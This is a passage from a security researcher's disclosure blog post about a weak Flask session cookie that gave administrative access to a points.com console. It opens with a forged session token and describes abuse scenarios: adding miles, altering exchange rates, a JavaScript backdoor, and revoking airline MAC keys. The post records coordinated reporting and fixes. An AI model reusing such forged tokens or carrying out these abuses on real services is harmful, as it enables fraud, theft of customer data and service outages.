session=.eJy9U01r3DAU_C8-x1lJ1oe9UOgSegiUsrQhCZRg9PG0665tOZKcdgn5733eHAKFQLeHniw_zcwbzZOei9am6NscDjAW68IYZj2BWhhGPK2c9WDAGl5J21BDJfFVw7xmQohGUssqU3lrpVJKgLOCFBdF6yOkfbHOcQb86xzKaiW1sc5pKsFVEpWp8xKEr4hV0FhPOcMaIIZboog0-BFgFSOESKdBg68J99Y1TCheNYJ7SmythamAEkJrRqWoBRXK1jVIDU7r2hvOFGHOVYutOUF8dVMLrtA9lIYyVnJElZoyXnIq0YqtpW44MtIJbBwDxYQ02JBS1GWcEsaZthQbE43ARblYPxd6znsYc2d17sJ4c5xgObq1YR4zwmDQXY-VpIefdo7x-HEK3ZjTpQ0DbnvQeY7Q-l7vUrH-XmQYphazhNF146490RMCn1g76HHWfWvCOKd20jt4LUd4nCHl1oeI624wc0wwoKVUPFwUuxjm6aR8FcYUetikba8zgoeNG7pxwZyTz6Bte4DjklH_-e5mpLfH_fXdl23Y3F6x-6a8fkyP0Knp0_awu__xa9x_hWn34Y2Iw1jS8t2SXlE7JjHQynAleaOgNsAtw8ugnGyM8MiL6Hnx_3xaIWef85TWq1Vvp8u3LFdPdHWCriJoV4axPxYvF39NeiecMxS2p9pmmr7N0xRiPoerp6lM59P6f2LZOeUwQPx_HQcdD5DxOuOTeeosJBtG3-0gpnNUTAgH1IiwtF-G_Af_vRE-vLz8BnvIpoE.ZFDJgQ.Lld9KeetbZJ_KBeLI2KOHB7EnaA
```

After plugging this cookie in, we attempted to revisit the "console.points.com" website and saw a bunch of extra functionality. We were in and had full administrative privileges!

One page that immediately grabbed our attention was "Manual Bonus". After clicking it, we realized that it was capable of manually adding rewards points for any program to any rewards account. Jackpot!

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FZFftoCl45kcaY_ELwtZAgYUD6_Mq6o3yC2NC9qY0qdArevt-f-qnEHDz3ytY1VUvQXifAnvGR6ReL_wVYGjHMgRP5qZszRUS7kSHwgj21P5fLC10qLc6Vo4WVIA_dvrbA2WFeFUrehE1KUtIkCjPVe8&w=3840&q=75)

We could additionally access the "admin-loyaltywallet.points.com" website after clicking the "Loyalty Platform" sidebar button. This website had additional functionality, allowing us to query users via their name, member ID, or email address, and much much more:

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FWimzXaYwwH6kb4qUaolMJBp6jk8VpBOc7kxq-MYTrHqU9wIq3B0QtwEFw52LL4LlOzeMXDF6yF0J-ZJHTCy2snEBVi7sB-oXQPeaai775galLRq3-pZpjF4_j3TCRbaQLWLGu7dH6f1LZ3nZ1LyKS78&w=3840&q=75)

Other tabs included config and experiment management:

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2FvI4a6-ACEWD2MUboLdzBvhvgEkynUYqL-YTdxUKlxaKWF4MAyzT49Y-V1CEz90e3W3qF9scudpTsgwQDxZRCeTF47ByISQhw6rTp89ya-R4klgjw3zXECD8BISUYQUuj8RNsM6WDEB9HsL65KP27brY&w=3840&q=75)

Another fun bit of impact was the ability to modify the rewards exchange amounts through the Promos tab. We could update rewards programs to offer, for example, 100 million United miles in exchange for 1 Delta mile, or simply 1 million miles for every dollar spent on a particular program. Users would then be able to exchange their miles, giving them nearly unlimited miles.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2Fyk2oAY84YQYwwKN-fceFIa9546bI_uQI2Q6Pi5X4STJAwosKrMwpYwWISyxXMBJlexm88PW3n_dEIUqb0dYNdiaZdDsoQVJs1dvTpxYHDTPEmeGqjpnvx_upw3hGKCrqyYuAz2_vfYJSZwB7IP4-so8&w=3840&q=75)

For user management, you could view, update, or delete user accounts. It was possible to see all account history, connections, and memberships for the accounts.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh3.googleusercontent.com%2FICwCnMoQTmWw3iUfCVV9_CqIGlStlwsWkpqePJJ80vza80VuGC7DmMhNkAhl5GDULYh1i_gU4Iw8ZFAuUMfgk0Tblz4wJkd5rdwoi5HzddaqRapazmaLA6qPP25EYNhCeIA3fKIO4cVXbjJHiqIVBYY&w=3840&q=75)

Two other interesting pages on the "console.points.com" website were the Modules and Routes endpoints. An attacker could use this as intended to add malicious JavaScript to every page on the administration panel. If undetected, it would make for a super fun backdoor where an attacker's JavaScript would be loaded on every page of the administration website.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh6.googleusercontent.com%2Fz61AO9a1akReYT7rjrIvtx2Spqjiiexf-QFuV0MpXq9_XunpAVSvINUN3LwoHcyfACCRCEUhs1TrT84nC_E01IecU20LKd1FZ5CcndQgSaO0_CUDaT44WuqA4bihgWiLINriaOsebPFXEL2wNdsR0Ac&w=3840&q=75)

Since these were all production rewards customers, an attacker could temporarily shut down all rewards travel by modifying the key pairs used by each airline on the Platform Partners endpoint. Once the MAC ID and MAC key were overwritten, it would break the infrastructure used by airlines to communicate with points.com, meaning customers would be unable to book flights using airline miles.

![](https://samcurry.net/_next/image?url=https%3A%2F%2Flh5.googleusercontent.com%2FdnArZrAOy4EUoOCO4vTLWg-W8IujzlPTufVoBxK4vHlXMarwAdh27-CrVWGXTwUzaGs4GaXawlINWdkUKdZ-ZiPpmSO-U2r2KtNJp2E7Q-B9BWmbudzOp7WijD3cuy_U0_pJSmh7ZIBe19NS6ijPAVU&w=3840&q=75)

Something important to note is that this administration panel was built for points.com employees to manage rewards programs at the tenant level. An attacker with this level of access could revoke the credentials used by the actual airline to provide service to their customers to access the API, thereby shutting down global rewards travel for that specific airline. In addition to accessing customer account information. There are many interesting scenarios in which a malicious attacker could've abused this access.

We reported the vulnerability and the points.com team responded almost immediately, even though our email was sent at 3:26 AM CST (sorry for hacking so late, both Ian and I were restless on a plane when we found this vulnerability!). The team understood the severity of the report and immediately took down the "console.points.com" website.

We attempted to bypass their fix via vhost hopping from the origin server IP with no luck. The site was completely taken down and the issue would be fixed shortly after.

## Closing

After submitting our last report to the points.com team, the overall findings had allowed us to access to customer information for a huge percentage of global rewards programs, transfer points on behalf of customers, and finally access the global administration panel. We had reported all issues to the points.com security team who very quickly patched them and worked with us in creating this disclosure.

This blog post, along with our other research ( [taking over a dozen TLDs](https://hackcompute.com/hacking-epp-servers/); being able to [remotely unlock, locate, and sometimes disable over a dozen different auto manufacturers vehicles](https://samcurry.net/web-hackers-vs-the-auto-industry/)) follows the theme of high impact vulnerability research where an attacker can compromise a single point of failure with widespread impact.

Thank you for reading! :P

## Disclosure Timeline

- March 8, 2023 - Reported Miles Theft and PII Disclosure Vulnerability (#1)
- March 8, 2023 - Response from points.com acknowledging the issue
- March 9, 2023 - Sent additional information on how to escalate March 8th finding (#2)
- March 9, 2023 - Response from points.com, site taken offline
- March 29, 2023 - Received email from points.com about regarding a comprehensive fix
- March 29, 2023 - Sent response validating the comprehensive fix
- April 29, 2023 - Reported United Authorization Bypass (#3)
- April 29, 2023 -  Response from points.com, site taken offline
- May 2, 2023 - Sent report for leaked Virgin credentials (#4)
- May 2, 2023 - Response from points.com, endpoint removed
- May 2, 2023 - Sent report for Weak Flask Session Cookie (#5)
- May 2, 2023 - Response from points.com, site taken offline
- August 3, 2023 - Disclosure

## Special thanks to...

- Nick Wright for the amazing cover image ( [https://instagram.com/nick99w](https://instagram.com/nick99w))
- Daniel Ritter ( [https://twitter.com/\_danritter](https://twitter.com/_danritter))
- Brett Buerhaus ( [https://twitter.com/bbuerhaus](https://twitter.com/bbuerhaus))
- Samuel Erb ( [https://twitter.com/erbbysam](https://twitter.com/erbbysam))
- Joseph Thacker ( [https://twitter.com/rez0\_\_](https://twitter.com/rez0__))
- Gal Nagli ( [https://twitter.com/naglinagli](https://twitter.com/naglinagli))
- Noah Pearson